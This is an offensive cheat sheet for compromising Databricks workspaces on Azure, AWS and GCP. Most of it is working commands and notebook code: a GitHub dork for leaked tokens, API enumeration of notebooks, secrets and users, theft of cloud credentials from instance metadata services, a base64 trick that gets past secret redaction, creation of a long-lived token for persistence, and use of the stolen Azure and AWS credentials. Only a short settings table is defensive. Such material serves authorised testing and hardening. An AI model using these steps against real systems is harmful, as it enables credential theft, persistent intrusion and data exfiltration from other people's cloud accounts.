#Databricks #Azure #AWS #cloud #dataengineering #enterprise #notebooks

## What is Databricks?
Unified analytics platform built on Apache Spark — deployed as a managed service on Azure, AWS, or GCP. Widely used in enterprise data engineering and ML pipelines. Attack surface: Personal Access Tokens (PATs) with excessive privileges, notebook code execution reaching cloud metadata services, DBFS sensitive data, misconfigured cluster policies, and secrets scope misconfigurations.

- **Azure**: `https://<workspace>.azuredatabricks.net`
- **AWS**: `https://<workspace>.cloud.databricks.com`
- **GCP**: `https://<workspace>.<region>.gcp.databricks.com`
- **REST API base**: `https://<workspace>/api/2.0/`
- **Port**: TCP 443 (HTTPS only — SaaS)

---

## Authentication

```bash
# Personal Access Token (PAT) — primary auth method
# Generate: User Settings → Access Tokens → Generate New Token

# Test token validity
curl -s https://<workspace>/api/2.0/clusters/list \
  -H "Authorization: Bearer <PAT>"

# List current user
curl -s https://<workspace>/api/2.0/preview/scim/v2/Me \
  -H "Authorization: Bearer <PAT>"

# Token locations to check:
# - Git repos (GitHub/GitLab search for dapi + 32 hex chars)
# - CI/CD pipeline configs (GitHub Actions secrets leaks, Azure DevOps)
# - Jupyter/notebook files checked into git
# - .env files, config files in repos
# - Azure Key Vault (if accessible)
# - Postman collections, Swagger files

# Databricks PAT format: dapi<32_hex_chars>
# GitHub dork: "dapi" site:github.com
```

---

## Enumeration

```bash
# List workspaces / clusters
curl -s https://<workspace>/api/2.0/clusters/list \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# List notebooks / files
curl -s "https://<workspace>/api/2.0/workspace/list?path=/" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# List jobs
curl -s https://<workspace>/api/2.0/jobs/list \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# List DBFS contents
curl -s "https://<workspace>/api/2.0/dbfs/list?path=/" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# List secret scopes
curl -s https://<workspace>/api/2.0/secrets/scopes/list \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# List secrets in scope (values not returned — but names reveal what's stored)
curl -s "https://<workspace>/api/2.0/secrets/list?scope=<scope_name>" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# List users (SCIM API)
curl -s https://<workspace>/api/2.0/preview/scim/v2/Users \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# List groups
curl -s https://<workspace>/api/2.0/preview/scim/v2/Groups \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool
```

---

## Attack Vectors

### Notebook Code Execution → Cloud Metadata

Any notebook cell gives OS-level access as the cluster service account. In cloud environments, this reaches the instance metadata service (IMDS) — leaking cloud credentials.

```python
# In a Databricks notebook cell:

# OS commands
import subprocess
result = subprocess.run(['id'], capture_output=True, text=True)
print(result.stdout)

# Hostname / IP
import socket
print(socket.gethostname())

# --- Azure IMDS — steal managed identity token ---
import requests
# Azure IMDS endpoint (accessible from cluster nodes)
url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
headers = {"Metadata": "true"}
r = requests.get(url, headers=headers)
print(r.json())

# Get OAuth token for Azure resources (Storage, Key Vault, etc.)
token_url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
r = requests.get(token_url, headers={"Metadata": "true"})
print(r.json()['access_token'])

# --- AWS IMDS — steal IAM role credentials ---
# Get attached role name
role = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/").text
print(f"Role: {role}")

# Get temporary credentials
creds = requests.get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}").json()
print(f"AccessKeyId: {creds['AccessKeyId']}")
print(f"SecretAccessKey: {creds['SecretAccessKey']}")
print(f"Token: {creds['Token']}")

# --- GCP Metadata ---
headers = {"Metadata-Flavor": "Google"}
sa_token = requests.get(
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
  headers=headers
).json()
print(sa_token['access_token'])
```

### Read Secrets from Notebooks / DBFS

```bash
# Export notebook content (Base64 encoded)
curl -s "https://<workspace>/api/2.0/workspace/export?path=/Users/<user>/notebook&format=SOURCE" \
  -H "Authorization: Bearer <PAT>" | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['content']).decode())"

# Search notebooks for hardcoded credentials
# List all notebooks recursively
curl -s "https://<workspace>/api/2.0/workspace/list?path=/Users" \
  -H "Authorization: Bearer <PAT>"

# DBFS — read files (may contain data exports, configs, credentials)
curl -s "https://<workspace>/api/2.0/dbfs/list?path=/FileStore" \
  -H "Authorization: Bearer <PAT>"

# Read DBFS file (Base64 encoded)
curl -s "https://<workspace>/api/2.0/dbfs/read?path=/FileStore/config.json&length=1000000" \
  -H "Authorization: Bearer <PAT>" | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']).decode())"
```

### Secret Scope Misconfigurations

```bash
# Databricks secrets are stored in secret scopes
# Secret values cannot be retrieved via API... unless:
# 1. You have notebook execution → use dbutils.secrets.get() inside notebook
# 2. Secret ACLs misconfigured — overly permissive

# In a notebook:
# Read secrets (bypasses API restriction — values visible inside notebooks)
dbutils.secrets.list(scope="<scope_name>")
secret_val = dbutils.secrets.get(scope="<scope_name>", key="<key_name>")
print(secret_val)   # Databricks redacts in output but value is in memory
# Bypass redaction:
import base64
print(base64.b64encode(secret_val.encode()).decode())
```

### Job / Cluster Config — Credential Extraction

```bash
# Job configs often contain spark.hadoop credentials, S3 keys, JDBC passwords
curl -s "https://<workspace>/api/2.0/jobs/get?job_id=<id>" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool | \
  grep -i "password\|secret\|key\|token\|jdbc\|storage"

# Cluster configs — spark.hadoop.fs.s3a.access.key, fs.azure credentials
curl -s "https://<workspace>/api/2.0/clusters/get?cluster_id=<id>" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool | \
  grep -A 2 -i "spark_conf\|env_vars\|password\|key\|secret"
```

### Generate / Steal PAT via Compromised Session

```bash
# If you have a user session (browser cookie / UI access):
# Generate a new PAT for persistence
curl -s -X POST https://<workspace>/api/2.0/token/create \
  -H "Authorization: Bearer <existing_PAT>" \
  -H "Content-Type: application/json" \
  -d '{"comment":"backup","lifetime_seconds":2592000}'
# Returns new token — store for persistent access

# List existing tokens (identify admin tokens)
curl -s https://<workspace>/api/2.0/token/list \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool
```

### Unity Catalog / Data Access

```bash
# List catalogs (Unity Catalog)
curl -s https://<workspace>/api/2.1/unity-catalog/catalogs \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# List schemas
curl -s "https://<workspace>/api/2.1/unity-catalog/schemas?catalog_name=<catalog>" \
  -H "Authorization: Bearer <PAT>"

# List tables
curl -s "https://<workspace>/api/2.1/unity-catalog/tables?catalog_name=<catalog>&schema_name=<schema>" \
  -H "Authorization: Bearer <PAT>"

# Execute SQL via Statement API (run queries against tables)
curl -s -X POST https://<workspace>/api/2.0/sql/statements \
  -H "Authorization: Bearer <PAT>" \
  -H "Content-Type: application/json" \
  -d '{
    "warehouse_id": "<warehouse_id>",
    "statement": "SELECT * FROM <catalog>.<schema>.<table> LIMIT 100",
    "wait_timeout": "30s"
  }'
```

---

## Post-Exploitation

```bash
# Use stolen Azure managed identity token to access Azure resources
access_token="<stolen_token>"

# List Azure subscriptions
curl -s "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  -H "Authorization: Bearer $access_token"

# List Azure Key Vault secrets
curl -s "https://<keyvault>.vault.azure.net/secrets?api-version=7.3" \
  -H "Authorization: Bearer $access_token"

# Use stolen AWS credentials
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<Token>"
aws sts get-caller-identity
aws s3 ls
aws secretsmanager list-secrets
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| PAT with admin permissions | Full workspace control |
| Cluster with no isolation | Notebook code accesses IMDS → cloud creds |
| Hardcoded secrets in notebooks | Source code exposure → credential leak |
| Overly permissive secret scope ACLs | Any user reads all secrets |
| Workspace-level permissions (not Unity Catalog) | Broad data access |
| No IP access list configured | PAT usable from any IP |
| Long-lived PATs (no expiry) | Persistent access after compromise |

---

## Quick Reference

| Goal | Command |
|---|---|
| Test PAT | `curl -s https://workspace/api/2.0/clusters/list -H "Authorization: Bearer <PAT>"` |
| List notebooks | `curl ... /api/2.0/workspace/list?path=/Users` |
| Export notebook | `curl ... /api/2.0/workspace/export?path=<path>&format=SOURCE` |
| List secrets | `curl ... /api/2.0/secrets/scopes/list` |
| Read secret (notebook) | `dbutils.secrets.get(scope="<scope>", key="<key>")` |
| Azure IMDS token | `curl http://169.254.169.254/metadata/identity/oauth2/token?...` |
| AWS IMDS creds | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` |
| List DBFS | `curl ... /api/2.0/dbfs/list?path=/` |
| Run SQL | `POST /api/2.0/sql/statements` with warehouse_id + statement |
